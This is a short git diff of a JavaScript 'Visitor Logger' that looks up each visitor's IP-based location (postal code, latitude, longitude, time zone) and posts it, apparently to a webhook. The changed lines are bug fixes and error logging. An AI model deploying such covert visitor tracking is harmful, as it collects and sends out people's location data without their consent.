@@ -118,8 +118,8 @@ fetch('https://ipapi.co/json/')
       { name: "Country", value: data.country_name || "N/A", inline: true },
       { name: "Country Code", value: data.country || "N/A", inline: true },
       { name: "Postal Code", value: data.postal || "N/A", inline: true },
-      { name: "Latitude", value: data.latitude || "N/A", inline: true },
-      { name: "Longitude", value: data.longitude || "N/A", inline: true },
+      { name: "Latitude", value: String(data.latitude) || "N/A", inline: true },
+      { name: "Longitude", value: String(data.longitude) || "N/A", inline: true },
       { name: "Time Zone", value: data.timezone || "N/A", inline: true },
       { name: "Region Code", value: data.region_code || "N/A", inline: true },
       { name: "Country Calling Code", value: data.country_calling_code || "N/A", inline: true },
@@ -130,6 +130,11 @@ fetch('https://ipapi.co/json/')
 
     // Filter out invalid fields
     const validFields = embedFields.filter(field => field.value && field.value !== "N/A");
+
+    if (validFields.length === 0) {
+      console.error("No valid fields to send.");
+      return;
+    }
 
     const payload = {
       username: "Visitor Logger",
@@ -156,6 +161,7 @@ fetch('https://ipapi.co/json/')
         console.log("Visitor information sent successfully!");
       } else {
         console.error("Failed to send visitor information. Status:", response.status);
+        response.text().then(text => console.error("Details:", text));
       }
     })
     .catch(error => console.error("Error:", error));
